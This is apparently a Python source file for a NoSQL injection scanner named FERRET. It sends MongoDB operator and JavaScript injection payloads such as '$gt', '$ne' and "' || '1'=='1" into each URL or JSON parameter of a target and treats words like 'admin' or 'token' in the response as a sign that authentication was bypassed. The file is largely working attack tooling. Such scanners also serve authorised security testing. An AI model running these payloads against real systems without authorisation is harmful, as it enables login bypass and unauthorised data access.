# ============================================================
#  FERRET - detect.py
#  Detects NoSQL injection points in URL params & JSON body
# ============================================================

import requests
import json
from colorama import Fore, Style, init
init(autoreset=True)

GREEN  = Fore.GREEN
RED    = Fore.RED
YELLOW = Fore.YELLOW
CYAN   = Fore.CYAN
BOLD   = Style.BRIGHT
RESET  = Style.RESET_ALL

# MongoDB injection test payloads
DETECTION_PAYLOADS = [
    {"type": "operator",  "value": {"$gt": ""}},
    {"type": "operator",  "value": {"$ne": None}},
    {"type": "operator",  "value": {"$exists": True}},
    {"type": "operator",  "value": {"$regex": ".*"}},
    {"type": "string",    "value": "' || '1'=='1"},
    {"type": "string",    "value": "'; return true; var x='"},
    {"type": "string",    "value": "{$gt: ''}"},
    {"type": "string",    "value": "[$ne]=1"},
]

class Detector:
    def __init__(self, url, params=None, headers=None, method="POST", timeout=10):
        self.url      = url
        self.params   = params or {}
        self.headers  = headers or {"Content-Type": "application/json"}
        self.method   = method.upper()
        self.timeout  = timeout
        self.findings = []

    def _send(self, data):
        try:
            if self.method == "POST":
                resp = requests.post(
                    self.url,
                    json=data,
                    headers=self.headers,
                    timeout=self.timeout
                )
            else:
                resp = requests.get(
                    self.url,
                    params=data,
                    headers=self.headers,
                    timeout=self.timeout
                )
            return resp
        except requests.exceptions.ConnectionError:
            print(f"{RED}[ERROR] Cannot connect to {self.url}{RESET}")
            return None
        except requests.exceptions.Timeout:
            print(f"{YELLOW}[TIMEOUT] Request timed out{RESET}")
            return None

    def _baseline(self):
        """Get normal response to compare against"""
        data = {k: "normalvalue123" for k in self.params}
        resp = self._send(data)
        if resp:
            return resp.status_code, len(resp.text)
        return None, None

    def run(self):
        print(f"\n{CYAN}{BOLD}[*] Starting detection on: {self.url}{RESET}")
        print(f"{CYAN}[*] Parameters: {list(self.params.keys())}{RESET}")
        print(f"{CYAN}[*] Method: {self.method}{RESET}\n")

        base_status, base_length = self._baseline()
        if base_status is None:
            print(f"{RED}[!] Could not reach target. Aborting.{RESET}")
            return []

        print(f"{YELLOW}[*] Baseline response — Status: {base_status} | Length: {base_length}{RESET}\n")

        for param in self.params:
            print(f"{BOLD}[*] Testing parameter: '{param}'{RESET}")

            for payload in DETECTION_PAYLOADS:
                data = dict(self.params)
                data[param] = payload["value"]

                resp = self._send(data)
                if resp is None:
                    continue

                # Detection logic
                status_changed  = resp.status_code != base_status
                length_changed  = abs(len(resp.text) - base_length) > 50
                success_keyword = any(k in resp.text.lower() for k in [
                    "welcome", "dashboard", "logout", "token",
                    "success", "admin", "home", "profile"
                ])
                error_keyword = any(k in resp.text.lower() for k in [
                    "syntax error", "mongo", "bson", "operator",
                    "unexpected token", "castError"
                ])

                if status_changed or length_changed or success_keyword or error_keyword:
                    finding = {
                        "parameter": param,
                        "payload":   str(payload["value"]),
                        "type":      payload["type"],
                        "status":    resp.status_code,
                        "length":    len(resp.text),
                        "reason":    []
                    }
                    if status_changed:
                        finding["reason"].append(f"Status changed: {base_status} → {resp.status_code}")
                    if length_changed:
                        finding["reason"].append(f"Response length changed: {base_length} → {len(resp.text)}")
                    if success_keyword:
                        finding["reason"].append("Success keyword detected in response")
                    if error_keyword:
                        finding["reason"].append("MongoDB error keyword detected")

                    self.findings.append(finding)
                    print(f"  {GREEN}{BOLD}[VULNERABLE] Parameter '{param}' | Payload: {payload['value']}{RESET}")
                    for r in finding["reason"]:
                        print(f"    {YELLOW}→ {r}{RESET}")
                else:
                    print(f"  {RED}[-] Not vulnerable to: {payload['value']}{RESET}")

        print(f"\n{CYAN}[*] Detection complete. Found {len(self.findings)} potential injection point(s).{RESET}\n")
        return self.findings